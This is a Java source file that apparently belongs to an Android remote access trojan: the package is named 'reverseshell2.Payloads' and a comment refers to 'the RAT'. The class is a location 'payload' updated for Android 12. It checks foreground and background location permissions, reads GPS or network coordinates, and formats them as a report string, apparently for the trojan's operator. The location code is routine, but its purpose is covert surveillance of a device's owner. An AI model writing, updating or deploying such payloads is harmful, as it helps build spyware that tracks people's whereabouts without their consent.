package com.example.reverseshell2.Payloads;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import static android.content.Context.LOCATION_SERVICE;

/**
 * Location payload, updated for Android 12.
 *
 * Android 12 (API 31) requirements addressed here:
 *  1. RUNTIME PERMISSION - Since Android 6.0 (API 23), ACCESS_FINE_LOCATION and
 *     ACCESS_COARSE_LOCATION must be granted at runtime BEFORE any location API
 *     call. Without them, requestLocationUpdates() throws SecurityException.
 *  2. ANDROID 12 BACKGROUND LOCATION - Android 10+ (API 29) introduced
 *     ACCESS_BACKGROUND_LOCATION. On Android 12, if the app is in the background
 *     and does not hold ACCESS_BACKGROUND_LOCATION, location updates are
 *     delivered only occasionally (or not at all for getLastKnownLocation).
 *     This code now checks for it and reports clearly.
 *  3. getLastKnownLocation() can throw SecurityException - now wrapped.
 *  4. onStatusChanged() is deprecated since API 29 - retained with @Deprecated
 *     annotation for older SDK compatibility (it is harmless).
 *  5. Android 12 "approximate location" toggle - if the user grants only
 *     approximate (coarse) access, precise GPS fix data may be unavailable;
 *     we now handle null results gracefully.
 *
 * IMPORTANT - Manifest permissions required:
 *     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
 *     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 *     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 *
 * IMPORTANT - Runtime permission flow (Android 10+/12):
 *     1. Request ACCESS_FINE_LOCATION / ACCESS_COARSE_LOCATION first.
 *     2. AFTER the user grants foreground location, you may request
 *        ACCESS_BACKGROUND_LOCATION in a separate dialog.
 */
public class locationManager {

    Context context;
    Activity activity;

    LocationManager mLocationManager;
    boolean isGPSEnabled = false;
    boolean isNetworkEnabled = false;
    Location location;

    Double latitude;
    Double longitude;

    public locationManager(Context context, Activity activity) {
        this.context = context;
        this.activity = activity;
    }

    /** Returns true if any location permission has been granted. */
    public boolean hasLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED
                    || context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true; // pre-Marshmallow: granted at install time
    }

    /** Returns true if the app may receive location updates while in the background (Android 10+). */
    public boolean hasBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return context.checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    == PackageManager.PERMISSION_GRANTED;
        }
        return true; // background location is not separately restricted before Android 10
    }

    public void location_init() {
        mLocationManager = (LocationManager) context.getSystemService(LOCATION_SERVICE);
        if (mLocationManager == null) {
            return;
        }
        try {
            isGPSEnabled = mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        } catch (SecurityException e) {
            isGPSEnabled = false;
            Log.e("locationManager", "GPS provider check blocked: location permission not granted", e);
        }
        try {
            isNetworkEnabled = mLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        } catch (SecurityException e) {
            isNetworkEnabled = false;
            Log.e("locationManager", "Network provider check blocked: location permission not granted", e);
        }
    }

    public void getNetworkLocation() {
        if (!hasLocationPermission()) {
            Log.e("locationManager", "getNetworkLocation: ACCESS_FINE/COARSE_LOCATION not granted");
            return;
        }
        try {
            mLocationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, 1000 * 60 * 1, 10, new LocationListener() {
                        @Override
                        public void onLocationChanged(Location location) {
                            // Called when a network fix arrives; the RAT reads last-known below.
                        }

                        @Override
                        @Deprecated
                        public void onStatusChanged(String s, int i, Bundle bundle) {
                        }

                        @Override
                        public void onProviderEnabled(String s) {
                        }

                        @Override
                        public void onProviderDisabled(String s) {
                        }
                    });
        } catch (SecurityException e) {
            Log.e("locationManager", "getNetworkLocation SecurityException", e);
            return;
        }

        if (mLocationManager != null) {
            try {
                location = mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            } catch (SecurityException e) {
                Log.e("locationManager", "getLastKnownLocation (network) SecurityException", e);
                location = null;
            }
            if (location != null) {
                latitude = location.getLatitude();
                longitude = location.getLongitude();
            }
        }
    }

    public void getGPSLocation() {
        if (!hasLocationPermission()) {
            Log.e("locationManager", "getGPSLocation: ACCESS_FINE/COARSE_LOCATION not granted");
            return;
        }
        try {
            mLocationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER, 1000 * 60 * 1, 10, new LocationListener() {
                        @Override
                        public void onLocationChanged(Location location) {
                        }

                        @Override
                        @Deprecated
                        public void onStatusChanged(String s, int i, Bundle bundle) {
                        }

                        @Override
                        public void onProviderEnabled(String s) {
                        }

                        @Override
                        public void onProviderDisabled(String s) {
                        }
                    });
        } catch (SecurityException e) {
            Log.e("locationManager", "getGPSLocation SecurityException", e);
            return;
        }

        if (mLocationManager != null) {
            try {
                location = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            } catch (SecurityException e) {
                Log.e("locationManager", "getLastKnownLocation (GPS) SecurityException", e);
                location = null;
            }
            if (location != null) {
                latitude = location.getLatitude();
                longitude = location.getLongitude();
            }
        }
    }

    public String getLocation() {

        String result = "";
        String lat = "";
        String lon = "";
        String whichOne = "";

        if (!hasLocationPermission()) {
            return "Location Permission Not Granted\n";
        }

        location_init();

        // On Android 10+, warn (but still try) if background location is missing.
        String bgNote = "";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !hasBackgroundLocationPermission()) {
            bgNote = "No background location permission (updates may be restricted)\n";
        }

        if (isNetworkEnabled && isGPSEnabled) {
            getGPSLocation();
            whichOne = "GPS Location\n";
            if (latitude != null && longitude != null) {
                lat = latitude.toString() + "\n";
                lon = longitude.toString() + "\n";
                Log.d("lot3", lat);
            }

        } else if (isGPSEnabled) {
            getGPSLocation();
            whichOne = "GPS Location\n";
            if (latitude != null && longitude != null) {
                lat = latitude.toString() + "\n";
                lon = longitude.toString() + "\n";
                Log.d("lot1", lat);
            }

        } else if (isNetworkEnabled) {
            getNetworkLocation();
            whichOne = "Network Location\n";
            if (latitude != null && longitude != null) {
                lat = latitude.toString() + "\n";
                lon = longitude.toString() + "\n";
                Log.d("lot2", lat);
            }
        }

        if (!lat.isEmpty() && !lon.isEmpty()) {
            result = whichOne + "Latitude is " + lat + "Longitude is " + lon + bgNote;
        } else {
            result = "Not able to get Network Location and GPS is disbled\n";
        }
        return result;
    }
}

